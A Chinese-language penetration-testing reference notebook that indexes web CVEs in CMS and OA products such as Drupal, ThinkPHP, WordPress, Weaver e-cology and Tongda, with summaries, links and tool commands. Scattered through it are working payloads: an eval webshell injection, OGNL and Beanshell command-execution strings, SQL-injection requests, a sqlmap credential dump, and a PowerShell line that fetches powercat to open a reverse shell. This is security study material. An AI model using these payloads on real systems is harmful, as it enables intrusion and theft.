# Web_CVE 漏洞记录

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

# 大纲

* **各类论坛/CMS框架**
    * [dedeCMS](#dedecms)
    * [Discuz](#discuz)
    * [Drupal](#drupal)
    * [ECshop](#ecshop)
    * [Joomla](#joomla)
    * [MetInfo](#metInfo)
    * [ThinkCMF](#thinkcmf)
    * [ThinkPHP](#thinkphp)
    * [WordPress](#wordpress)
    * [YxCMS](#yxcms)
    * [zcncms](#zcncms)
    * [泛微](#泛微)
    * [致远](#致远)
    * [通达](#通达)
    * [信呼](#信呼)

* **框架和中间件**
    * [ActiveMQ](#activemq)
    * [Dubbo](#dubbo)
    * [ElasticSearch](#elasticsearch)
    * [httpd](#httpd)
    * [IIS](#iis)
    * [JBOSS](#jboss)
    * [PHP](#php)
    * [Resin](#resin)
    * [RocketMQ](#rocketmq)
    * [shiro](#shiro)
    * [Solr](#solr)
    * [Spring](#spring)
    * [Struts2](#struts2)
    * [Tomcat](#tomcat)
    * [Weblogic](#weblogic)

* **组件**
    * [编辑器](#编辑器)
        * [ewebeditor](#ewebeditor)
        * [FCKeditor](#fckeditor)
        * [kindeditor](#kindeditor)
        * [ueditor](#ueditor)
    * [序列化](#序列化)
        * [fastjson](#fastjson)
        * [Jackson](#jackson)
        * [Xstream](#xstream)
    * [JavaScript库](#JavaScript库)
        * [KaTeX](#KaTeX)
    * [其他](#其他)
        * [Ghostscript](#ghostscript)
        * [webuploader](#webuploader)

* **服务**
    * [Aria2](#aria2)
    * [Confluence](#confluence)
    * [Coremail](#coremail)
    * [Crowd](#crowd)
    * [Harbor](#harbor)
    * [Jenkins](#jenkins)
    * [Jira](#jira)
    * [Jupyter](#jupyter)
    * [Nexus](#nexus)
    * [noVNC](#novnc)
    * [phpMyAdmin](#phpmyadmin)
    * [PHP-FPM](#php-fpm)
    * [Smartbi](#smartbi)
    * [Supervisord](#supervisord)
    * [Webmin](#webmin)
    * [zabbix](#zabbix)

---

# 各类论坛/CMS框架

**什么是 CMS**

内容管理系统 (CMS) 是一种存储所有数据 (如文本,照片,音乐,文档等) 并在你的网站上提供的软件. 它有助于编辑,发布和修改网站的内容.

**工具包**
- [SecWiki/CMS-Hunter](https://github.com/SecWiki/CMS-Hunter) - CMS 漏洞测试用例集合
- [Q2h1Cg/CMS-Exploit-Framework](https://github.com/Q2h1Cg/CMS-Exploit-Framework) - 一款 CMS 漏洞利用框架，通过它可以很容易地获取、开发 CMS 漏洞利用插件并对目标应用进行测试。
- [Lucifer1993/AngelSword](https://github.com/Lucifer1993/AngelSword) - Python3 编写的 CMS 漏洞检测框架
- [foospidy/web-cve-tests](https://github.com/foospidy/web-cve-tests) - A simple framework for sending test payloads for known web CVEs.

## dedeCMS

> 官网 : http://www.dedecms.com/

**工具**
- [lengjibo/dedecmscan](https://github.com/lengjibo/dedecmscan) - 织梦全版本漏洞扫描工具

**文章**
- [解决DEDECMS历史难题--找后台目录](https://xz.aliyun.com/t/2064)

---

## Discuz
### Discuz

> 官网 : https://www.discuz.net/forum.php

**文章**
- [Discuz!X 前台任意文件删除漏洞深入解析](https://xz.aliyun.com/t/34)
- [Discuz!因Memcached未授权访问导致的RCE](https://xz.aliyun.com/t/2018)
- [Discuz!X 个人账户删除漏洞](https://xz.aliyun.com/t/2297)
- [Discuz!x3.4后台文件任意删除漏洞分析](https://xz.aliyun.com/t/4725)
- [DiscuzX v3.4 排行页面存储型XSS漏洞 分析](https://xz.aliyun.com/t/2899)

**CVE-2018-14729**
- 简介

    Discuz！1.5 至 2.5 中的 `source/admincp/admincp_db.php` 中的数据库备份功能允许远程攻击者执行任意 PHP 代码。

- 影响版本
    - Discuz! 1.5 ~ 2.5

- 文章
    - [Discuz! 1.5-2.5 命令执行漏洞分析(CVE-2018-14729)](https://paper.seebug.org/763/)

- POC | Payload | exp
    - [FoolMitAh/CVE-2018-14729](https://github.com/FoolMitAh/CVE-2018-14729)

### Discuz!ML

> 官网 : https://discuz.ml/

**discuzml-v-3-x-code-injection-vulnerability**
- POC | Payload | exp
    - [theLSA/discuz-ml-rce](https://github.com/theLSA/discuz-ml-rce)

**CVE-2019-13956**
- 简介

    该漏洞存在 discuz ml(多国语言版)中,cookie 中的 language 可控并且没有严格过滤,导致可以远程代码执行。

- 影响版本
    - Discuz! ML V3.2
    - Discuz! ML V3.3
    - Discuz! ML V3.4

- 文章
    - [Discuz! ML远程代码执行(CVE-2019-13956)](https://www.cnblogs.com/yuzly/p/11386755.html)
    - [Discuz!ML V3.X 代码注入分析 ](https://xz.aliyun.com/t/5638)

---

## Drupal

> 官网 : https://www.drupal.org/

**存在该环境的靶场**
- [DC: 1](../../../实验/靶机/VulnHub/DC/DC1-WalkThrough.md)
- [DC: 7](../../../实验/靶机/VulnHub/DC/DC7-WalkThrough.md)
- [DC: 8](../../../实验/靶机/VulnHub/DC/DC8-WalkThrough.md)

**CVE-2014-3704 “Drupalgeddon” SQL 注入漏洞**
- 简介

    Drupal 7.0~7.31 版本中存在一处无需认证的 SQL 漏洞。通过该漏洞，攻击者可以执行任意 SQL 语句，插入、修改管理员信息，甚至执行任意代码。

- 影响版本
    - Drupal 7.0 ~ 7.31

- POC | Payload | exp
    - https://vulhub.org/#/environments/drupal/CVE-2014-3704/
    - https://www.exploit-db.com/exploits/34992

- MSF Module
    ```bash
    use exploit/multi/http/drupal_drupageddon
    set RHOSTS <IP>
    run
    ```

**CVE-2017-6920 Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞**
- 简介

    2017年6月21日,Drupal 官方发布了一个编号为 CVE-2017- 6920 的漏洞,影响为 Critical.这是 Drupal Core 的 YAML 解析器处理不当所导致的一个远程代码执行漏洞,影响 8.x 的 Drupal Core.

- 影响版本
    - Drupal 8.x

- 文章
    - [CVE-2017-6920:Drupal远程代码执行漏洞分析及POC构造](https://paper.seebug.org/334/)
    - [Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞 (CVE-2017-6920) ](https://vulhub.org/#/environments/drupal/CVE-2017-6920/)

**CVE-2018-7600 Drupal Drupalgeddon 2 远程代码执行漏洞**
- 简介

    Drupal 是一款用量庞大的 CMS，其 6/7/8 版本的 Form API 中存在一处远程代码执行漏洞。

- 影响版本
    - Drupal 6/7/8

- POC | Payload | exp
    - https://github.com/vulhub/vulhub/blob/master/drupal/CVE-2018-7600/README.zh-cn.md
    - [pimps/CVE-2018-7600](https://github.com/pimps/CVE-2018-7600)
    - [dreadlocked/Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)

- MSF Module
    ```bash
    use exploit/unix/webapp/drupal_drupalgeddon2
    set RHOSTS <IP>
    run
    ```

**CVE-2018-7602 远程代码执行漏洞**
- 影响版本
    - Drupal 7.x
    - Drupal 8.x

- POC | Payload | exp
    - [Drupal 远程代码执行漏洞（CVE-2018-7602）](https://vulhub.org/#/environments/drupal/CVE-2018-7602/)
    - [CVE-2018-7600/drupa7-CVE-2018-7602.py](https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7602.py)

**CVE-2019-6339 远程代码执行漏洞**
- 简介

    phar 反序列化 RCE

- 影响版本
    - Drupal 7.0 ~ 7.62
    - Drupal 8.5.0 ~ 8.5.9
    - Drupal 8.6.0 ~ 8.6.6

- 文章
    - [Drupal 1-click to RCE 分析](https://paper.seebug.org/897/)

- POC | Payload | exp
    - https://vulhub.org/#/environments/drupal/CVE-2019-6339/

**CVE-2019-6341 XSS**
- 简介

    通过文件模块或者子系统上传恶意文件触发 XSS 漏洞

- 影响版本
    - Drupal 7.0 ~ 7.65
    - Drupal 8.5.0 ~ 8.5.14
    - Drupal 8.6.0 ~ 8.6.13

- 文章
    - [Drupal 1-click to RCE 分析](https://paper.seebug.org/897/)

- POC | Payload | exp
    - https://vulhub.org/#/environments/drupal/CVE-2019-6341/

---

## ECshop

> 官网 : http://www.ecshop.com/

ECShop 是一款 B2C 独立网店系统,适合企业及个人快速构建个性化网上商店.系统是基于 PHP 语言及 MYSQL 数据库构架开发的跨平台开源程序.

**ECShop 2.x/3.x SQL 注入/任意代码执行漏洞**
- 简介

    其2017年及以前的版本中,存在一处 SQL 注入漏洞,通过该漏洞可注入恶意数据,最终导致任意代码执行漏洞.其 3.6.0 最新版已修复该漏洞.

- 影响版本
    - ECShop 2.x/3.x

- 文章
    - [ECShop 2.x/3.x SQL注入/任意代码执行漏洞](https://github.com/vulhub/vulhub/blob/master/ecshop/xianzhi-2017-02-82239600/README.zh-cn.md)
    - [ecshop2.x 代码执行](https://paper.seebug.org/691/)

---

## Joomla

> 官网 : https://www.joomla.org/

**存在该环境的靶场**
- [DC: 3](../../../实验/靶机/VulnHub/DC/DC3-WalkThrough.md)

**工具**
- [rezasp/joomscan](https://github.com/rezasp/joomscan) - 效果很差,没啥用

**CVE-2017-8917 Joomla! 3.7 Core SQL 注入**
- 简介

    Joomla 于5月17日发布了新版本 3.7.1,本次更新中修复一个高危 SQL 注入漏洞,成功利用该漏洞后攻击者可以在未授权的情况下进行 SQL 注入。

- 影响版本
    - joomla 3.7.0

- 文章
    - [Joomla! 3.7 Core SQL 注入 (CVE-2017-8917)漏洞分析](https://paper.seebug.org/305/)

- POC | Payload | exp
    ```
    http://你的 IP 地址:端口号/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)
    ```

    sqlmap payload
    ```bash
    sqlmap -u "http://192.168.1.1/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -T '#__users' -C name,password --dump
    ```

---

## MetInfo

> 官网: https://www.metinfo.cn/

**文章**
- [MetInfo5.3.19安装过程过滤不严导致Getshell](https://bbs.ichunqiu.com/thread-35305-1-17.html)
- [MetInfo6.0.0漏洞集合(一)](https://bbs.ichunqiu.com/thread-43416-1-7.html)
- [MetInfo6.1.0 漏洞(二)](https://bbs.ichunqiu.com/thread-43625-1-4.html)
- [Metinfo 6.1.2 SQL注入](https://bbs.ichunqiu.com/thread-46687-1-1.html)
- [metinfo最新版本后台getshell](https://bbs.ichunqiu.com/thread-29686-1-2.html)
- [Metinfo7的一些鸡肋漏洞](https://evi1.cn/post/metinfo7-bug/)
- [Metinfo7.0 SQL Blind Injection](https://github.com/T3qui1a/metinfo_sqlinjection/issues/1)

**CVE-2018-13024**
- 简介

    远程攻击者可通过向 admin/column/save.php 文件发送 `module` 参数利用该漏洞向 .php 文件写入代码并执行该代码.

- 影响版本
    - MetInfo 5.3.16
    - MetInfo 6.0.0

- 文章
    - [CVE-2018-13024复现及一次简单的内网渗透](https://www.freebuf.com/news/193748.html)

- POC | Payload | exp

    - `admin/column/save.php?name=123&action=editor&foldername=upload&module=22;@eval($_POST[1]);/*`

---

## October

> 官网: http://octobercms.com

**October CMS 1.0.412 - Multiple Vulnerabilities**
- POC | Payload | exp
    - [October CMS 1.0.412 - Multiple Vulnerabilities](https://www.exploit-db.com/exploits/41936)

---

## ThinkCMF

> 官网: https://www.thinkcmf.com/

**ThinkCMF 任意内容包含漏洞**
- POC | Payload | exp
    - [jas502n/ThinkCMF_getshell](https://github.com/jas502n/ThinkCMF_getshell)

---

## ThinkPHP

> 官网: http://www.thinkphp.cn/

### <5

**文章**
- [thinkphp一些版本的通杀漏洞payload](http://www.moonsec.com/post-853.html)
- [代码审计 | ThinkPHP3.x、5.x框架任意文件包含](https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=39586)
- [Thinkphp2.1爆出重大安全漏洞](https://www.cnblogs.com/milantgh/p/3639178.html)
- [ThinkPHP3.2.3框架实现安全数据库操作分析](https://xz.aliyun.com/t/79)
- [ThinkPHP-漏洞分析集合 ](https://xz.aliyun.com/t/2812)
- [ThinkPHP3.2 框架sql注入漏洞分析(2018-08-23)](https://xz.aliyun.com/t/2629)
- [Thinkphp框架 3.2.x sql注入漏洞分析](https://bbs.ichunqiu.com/thread-38901-1-12.html)

**日志泄露**
```bash
/Application/Runtime/Logs/Home/16_09_06.log # 其中 Application 可能会变，比如 App
/Runtime/Logs/Home/16_09_06.log             # 年份_月份_日期
/Runtime/Logs/User/16_09_06.log             # 年份_月份_日期
```
- [whirlwind110/tphack](https://github.com/whirlwind110/tphack) - Thinkphp3/5 Log 文件泄漏利用工具

### 5

**文章**
- [ThinkPHP 5.x (v5.0.23及v5.1.31以下版本) 远程命令执行漏洞利用 (GetShell) ](https://www.vulnspy.com/cn-thinkphp-5.x-rce/)
- [代码审计 | ThinkPHP3.x、5.x框架任意文件包含](https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=39586)
- [ThinkPHP 5.0.x、5.1.x、5.2.x 全版本远程命令执行漏洞](https://blog.csdn.net/csacs/article/details/86668057)
- [ThinkPHP v5.1.22曝出SQL注入漏洞](https://nosec.org/home/detail/1821.html)
- [ThinkPHP-漏洞分析集合 ](https://xz.aliyun.com/t/2812)
- [ThinkPHP 5.1.x SQL注入漏洞分析](https://www.freebuf.com/vuls/185420.html)
- [ThinkPHP框架 < 5.0.16 sql注入漏洞分析](https://bbs.ichunqiu.com/thread-38284-1-13.html)
- [ThinkPHP 5.x 远程命令执行漏洞利用过程](https://laucyun.com/a9142c328b103cd86a3715bd5073c4be.html)
- [ThinkPHP漏洞总结](http://zone.secevery.com/article/1165)

**工具**
- [Lucifer1993/TPscan](https://github.com/Lucifer1993/TPscan) - 一键 ThinkPHP 漏洞检测
- [theLSA/tp5-getshell](https://github.com/theLSA/tp5-getshell) - thinkphp5 rce 漏洞检测工具
- [sukabuliet/ThinkphpRCE](https://github.com/sukabuliet/ThinkphpRCE) - Thinkphp rce 扫描脚本，附带日志扫描

**资源**
- [Mochazz/ThinkPHP-Vuln](https://github.com/Mochazz/ThinkPHP-Vuln) - 关于 ThinkPHP 框架的历史漏洞分析集合
- [SkyBlueEternal/thinkphp-RCE-POC-Collection](https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection) - thinkphp v5.x 远程代码执行漏洞-POC集合

**日志泄露**
```bash
/runtime/log/202004/1.log       # 年月/数字
```
- [whirlwind110/tphack](https://github.com/whirlwind110/tphack) - Thinkphp 3/5 Log 文件泄漏利用工具

---

## WordPress

> 官网 : https://wordpress.org/

WordPress 是一个开源的内容管理系统(CMS),允许用户构建动态网站和博客.

**存在该环境的靶场**
- [DC: 2](../../../实验/靶机/VulnHub/DC/DC2-WalkThrough.md)
- [DC: 6](../../../实验/靶机/VulnHub/DC/DC6-WalkThrough.md)
- [symfonos1-WalkThrough](../../../实验/靶机/VulnHub/symfonos/symfonos1-WalkThrough.md)

**搭建教程**
- [WordPress 搭建](../../../../运维/Linux/Power-Linux.md#WordPress)

**Tips**

- 默认的登录地址一般是 `/wp-admin` 或 `/wp-login.php`

**工具**
- [wpscanteam/wpscan](https://github.com/wpscanteam/wpscan) - kali 自带,漏洞扫描需要 API Token,可扫用户、漏洞、目录,挺好用的
    ```bash
    wpscan --url https://www.xxxxx.com/     # 直接扫描
    wpscan --url https://www.xxxxx.com/ --enumerate u    # 枚举用户
    wpscan --url https://www.xxxxx.com/ --passwords /tmp/password.txt   # 密码爆破
    wpscan --url https://www.xxxxx.com/ --usernames admin --passwords out.txt  # 指定用户爆破
    wpscan --url https://www.xxxxx.com/ --api-token xxxxxxxxCX8TTkkgt2oIY   # 使用 API Token,扫描漏洞
    wpscan --url https://www.xxxxx.com/ -e vp --api-token xxxxxxx    # 扫描插件漏洞
    wpscan --url https://www.xxxxx.com/ -e vt --api-token xxxxxxx    # 扫描主题漏洞
    ```
    - [WPScan使用完整教程之记一次对WordPress的渗透过程](https://xz.aliyun.com/t/2794)

**插件漏洞**
- **WordPress Plugin Mail Masta 1.0 - Local File Inclusion**
    - https://www.exploit-db.com/exploits/40290

**CVE-2019-8942 & CVE-2019-8943 WordPress Crop-image Shell Upload**
- 简介

    此模块利用 WordPress 版本5.0.0和<= 4.9.8上的路径遍历和本地文件包含漏洞。 裁剪图像功能允许用户（至少具有作者权限）通过在上载期间更改 _wp_attached_file 引用来调整图像大小并执行路径遍历。 利用的第二部分将通过在创建帖子时更改 _wp_page_template 属性，将该图像包含在当前主题中。 目前，此漏洞利用模块仅适用于基于 Unix 的系统。

- 影响版本
    - wordpress < 4.9.9
    - wordpress 5.0 ~ 5.0:rc3

- POC | Payload | exp
    - [brianwrf/WordPress_4.9.8_RCE_POC: A simple PoC for WordPress RCE (author priviledge), refer to CVE-2019-8942 and CVE-2019-8943.](https://github.com/brianwrf/WordPress_4.9.8_RCE_POC)

- MSF Module
    ```
    use exploit/multi/http/wp_crop_rce
    ```

**WordPress <= 5.3.? DoS**
- POC | Payload | exp
    - [wordpress-dos-poc](https://github.com/roddux/wordpress-dos-poc)

---

## YxCMS

> 官网 : http://www.yxcms.net

**常见路径**
```
/index.php?r=admin  # 后台  默认管理员账号密码 admin 123456
```

**YxCMS 1.4.7 多个漏洞**
- 文章
    - [YxCMS 1.4.7 最新版漏洞分析](https://bbs.ichunqiu.com/thread-45926-1-1.html)

---

## zcncms

**文章**
- [zcncms多个漏洞-Musec](http://musec.lofter.com/post/303379_d39f0c)
- [ZCNCMS审计及漏洞分析](https://www.anquanke.com/post/id/179782)
- [代码审计——zcncms后台SQL注入(一) ](http://0day5.com/archives/4053/)
- [代码审计——zcncms几处漏洞合集(二) ](http://0day5.com/archives/4062/)

---

## 泛微

> 官网 : https://www.weaver.com.cn/

**文章**
- [应用安全 - 软件漏洞 - 泛微OA漏洞汇总](https://www.cnblogs.com/AtesetEnginner/p/11558469.html)

**指纹**
- `Set-Cookie: ecology_JSessionId=`
- `ecology`

**敏感文件泄露**
- `/messager/users.data`
- `/plugin/ewe/jsp/config.jsp`

**路径遍历**
- `/plugin/ewe/admin/upload.jsp?id=11&dir=../../../`
- `/weaver/weaver.file.SignatureDownLoad?markId=1+union+select+'../ecology/WEB-INF/prop/weaver.properties'`

**E-Mobile 4.5 RCE**
```
**.**.**.**/verifyLogin.do
data：loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${@**.**.**.**.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ipconfig').getInputStream())}

http://**.**.**.**/verifyLogin.do
data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
http://**.**.**.**:89/verifyLogin.do
data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
**.**.**.**/verifyLogin.do
data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
http://**.**.**.**/verifyLogin.do
data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
http://**.**.**.**/verifyLogin.do
data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
```

**e-mobile < 6.5 Ognl 表达式注入**
- 文章
    - [关于表达式注入的小记录](https://zhuanlan.zhihu.com/p/26052235)
    - [泛微 E-Mobile Ognl 表达式注入](https://blog.csdn.net/qq_27446553/article/details/68203308)
    - [泛微 E-Mobile Ognl 表达式注入](https://docs.ioin.in/writeup/www.sh0w.top/_index_php_archives_14_/index.html)

- POC | Payload | exp
    ```
    message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd=whoami
    ```

**e-cology OA Beanshell 组件远程代码执行**
- 文章
    - [[漏洞预警]泛微e-cology OA Beanshell组件远程代码执行分析](https://mp.weixin.qq.com/s/Hr6fSOaPcTp2YaD-fPMxyg)
    - [泛微e-cology OA Beanshell组件远程代码执行漏洞复现](https://mp.weixin.qq.com/s/LpXiLukOKMfMSa8gUYBqNA)

- POC | Payload | exp
    - [jas502n/e-cology](https://github.com/jas502n/e-cology)
    ```
    /weaver/bsh.servlet.BshServlet
    ```
    ```
    eval%00("ex"%2b"ec(\"whoami\")"); 也可以换成 ex\u0065c("cmd /c dir");
    ```
    泛微多数都是 windows 环境, 反弹 shell 可以使用 pcat
    ```
    powershell IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd
    ```

**ecology8_mobile_sql_inject**
- POC | Payload | exp
    - [ecology8_mobile_sql_inject](https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py)

**SSV-98083 | 泛微 e-cology OA 前台SQL注入**
- POC | Payload | exp
    - [AdministratorGithub/e-cology-OA-SQL](https://github.com/AdministratorGithub/e-cology-OA-SQL)

**泛微 OA WorkflowCenterTreeData 接口注入漏洞(限 oracle 数据库)**
- POC | Payload | exp
    ```
    POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1
    Host: ip:port
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 2236
    Connection: close
    Upgrade-Insecure-Requests: 1

    formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1
    ```

**泛微 ecology OA 系统接口存在数据库配置信息泄露漏洞**
- 文章
    - [泛微ecology OA数据库配置信息泄露漏洞复现](https://mp.weixin.qq.com/s/u8GIfMBRZFAN3HANSSSgQA)

- POC | Payload | exp
    - [jas502n/DBconfigReader](https://github.com/jas502n/DBconfigReader)
    - [NS-Sp4ce/Weaver-OA-E-cology-Database-Leak](https://github.com/NS-Sp4ce/Weaver-OA-E-cology-Database-Leak)

---

## 致远

> 官网 : http://www.seeyon.com/

**指纹**
- `/seeyon/htmlofficeservlet`
- `/seeyon/index.jsp`
- `seeyon`

**致远 OA A6 test.jsp sql 注入漏洞**
- 文章
    - [用友致远A6 OA存在sql注入并拿shell](https://www.pa55w0rd.online/yyoa/)

- POC | Payload | exp
    ```
    www.test.com/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database())
    www.test.com/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)
    ```

**致远 OA 帆软报表组件前台 XXE 漏洞**
- 文章
    - [致远OA帆软报表组件前台XXE漏洞(0day)挖掘过程](https://landgrey.me/blog/8/)

**帆软报表 v8.0 Getshell 漏洞**
- 文章
    - [帆软报表v8.0 Getshell漏洞分析](http://foreversong.cn/archives/1378)

**A8-OA-seeyon-RCE**
- 文章
    - [致远A8协同办公系统poc/seeyon 0day](https://www.jianshu.com/p/562f45edde2d)
    - [致远 OA A8 htmlofficeservlet getshell (POC&EXP)](http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/)

- POC | Payload | exp
    - [RayScri/A8-OA-seeyon-RCE](https://github.com/RayScri/A8-OA-seeyon-RCE)

---

## 通达

> 官网 : https://www.tongda2000.com/

**指纹**
- `tongda.ico`
- `Office Anywhere 20xx版 网络智能办公系统`
- `/ispirit/interface/gateway.php`
- `/mac/gateway.php`

**通达 OA 任意用户登录漏洞**
- 影响版本
    - 通达 OA 2017
    - 通达 OA V11.X--V11.5

- 文章
    - [通达OA < 11.5任意用户登录漏洞分析](https://mp.weixin.qq.com/s/yJuLhC1GxkMbGL0mRORIoA)
    - [通达OA 任意用户登录漏洞（匿名RCE）分析](https://www.zrools.org/2020/04/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8C%BF%E5%90%8DRCE%EF%BC%89%E5%88%86%E6%9E%90/)
    - [通达OA<11.5任意用户登陆另一处利用方法分析](https://mp.weixin.qq.com/s/I3dtd2ORNo_-vR9zWgnJjw)

- POC | Payload | exp
    - [NS-Sp4ce/TongDaOA-Fake-User](https://github.com/NS-Sp4ce/TongDaOA-Fake-User)

**通达 OA 任意文件上传漏洞+本地文件包含漏洞**
- POC | Payload | exp
    - [jas502n/OA-tongda-RCE](https://github.com/jas502n/OA-tongda-RCE)
    ```
    POST /mac/gateway.php HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Go-http-client/1.1
    Connection: close
    Content-Length: 44
    Content-Type: application/x-www-form-urlencoded
    Accept-Encoding: gzip

    json={"url":"/general/../../mysql5/my.ini"}
    ```

---

## 信呼

**信呼 OA 存储型 XSS**
- 影响版本
    - 信呼 v1.9.0~1.9.1

- 文章
    - [信呼OA存储型XSS 0day复现](https://xz.aliyun.com/t/7887)

---

# 框架和中间件

**文章**
- [中间件漏洞合集](https://mp.weixin.qq.com/s/yN8lxwL-49OKfVR86JF01g)
